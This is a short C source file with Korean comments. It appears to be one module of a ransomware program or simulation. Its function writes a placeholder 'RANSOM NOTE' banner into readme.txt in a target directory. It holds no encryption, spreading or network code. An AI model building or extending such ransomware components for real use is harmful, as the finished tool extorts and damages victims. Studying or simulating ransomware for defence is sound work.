#include "readme.h"
#include <stdio.h>
#include <string.h>

/*
 * README_CONTENT
 */
static const char *README_CONTENT =
"***************************************\n"
"*   RANSOM NOTE   *\n"
"***************************************\n"
"\n";

int write_readme(const char *target_dir)
{
    char path[1024]; // readme.txt 파일의 전체 경로를 저장할 버퍼
    
     // 대상 디렉터리 경로와 파일 이름(readme.txt)을 결합하여 전체 파일 경로를 생성
    if (snprintf(path, sizeof(path), "%s/readme.txt", target_dir)
        >= (int)sizeof(path)) {
        fprintf(stderr, "[README] path too long\n");
        return -1;
    }

     // 파일 열기: "w" 모드(쓰기 모드, 파일이 존재하면 내용을 덮어씀)
    FILE *fp = fopen(path, "w");
    if (!fp) {
        perror("[README] fopen");
        return -1;
    }

     // 랜섬 노트 내용(README_CONTENT)을 파일에 기록
    fputs(README_CONTENT, fp);
    fclose(fp);

    printf("[README] created: %s\n", path);
    return 0;
}

